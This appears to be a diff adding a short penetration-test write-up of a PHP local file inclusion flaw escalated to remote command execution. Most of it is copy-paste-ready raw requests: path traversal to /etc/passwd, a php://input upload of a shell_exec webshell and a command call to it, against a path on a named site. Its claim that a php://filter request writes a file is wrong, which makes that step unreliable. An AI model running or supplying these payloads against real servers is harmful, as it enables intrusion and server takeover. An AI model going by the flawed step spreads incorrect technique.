@@ -1,0 +1,62 @@
+1. LFI Test Case
+
+1.1 Bug name:LFI in "page" parameter → File write via php streams → RCE (PHP backend)
+
+This bug is about
+A Local File Inclusion in the `page` parameter allows reading files. By abusing php:// wrappers (and php://input / php://filter) you can write or include attacker-controlled PHP code and achieve remote command execution on a PHP-backed site (given writable locations or permissive open_basedir).
+
+Steps to reproduce (very short & copy-paste ready)
+
+Preconditions / example:
+- Target: https://target.local/index.php?page=
+- Backend: PHP
+- Tools: curl, browser, etc.
+- Test only on authorized targets.
+
+1) Confirm LFI / path traversal
+Request:
+GET /index.php?page=../../../../etc/passwd HTTP/1.1
+Host: target
+
+2) Attempt to write a file via php://filter (example writes base64-encoded content into a target file)
+Request:
+GET /index.php?page=php://filter/convert.base64-encode/resource=/var/www/vhosts/site.ru/httpdocs/test.php&data=<?php echo "OK"; ?> HTTP/1.1
+Host: target
+- If /test.php exists and returns "OK" → file write worked.
+
+3) Upload simple webshell via php://input
+Request:
+GET /index.php?page=php://input HTTP/1.1
+Host: target
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 40
+
+<?php echo shell_exec($_GET['cmd']); ?>
+
+Then call the uploaded shell (example):
+GET /test.php?cmd=id HTTP/1.1
+Host: target
+- Expected: output of `id` → RCE
+
+Notes / observed restrictions:
+- open_basedir may limit writable/readable paths (example: /var/www/vhosts/.../ and /tmp/).
+- If write not possible, try other wrappers/techniques (php://filter, expect://, data://, log poisoning, etc.).
+
+Quick pasteable payloads
+Header / LFI test:
+X (URL) : /index.php?page=../../../../etc/passwd
+
+php://filter write example:
+GET /index.php?page=php://filter/convert.base64-encode/resource=/var/www/vhosts/site.ru/httpdocs/test.php&data=<?php echo "OK"; ?> HTTP/1.1
+
+php://input shell upload:
+GET /index.php?page=php://input HTTP/1.1
+[body] <?php echo shell_exec($_GET['cmd']); ?>
+
+Invoke shell:
+GET /test.php?cmd=id HTTP/1.1
+
+Replace hosts, paths and payloads with your test values. Use only against systems you are authorized to test.
+
+____________________________________________________________________________________________________________________________________________
+
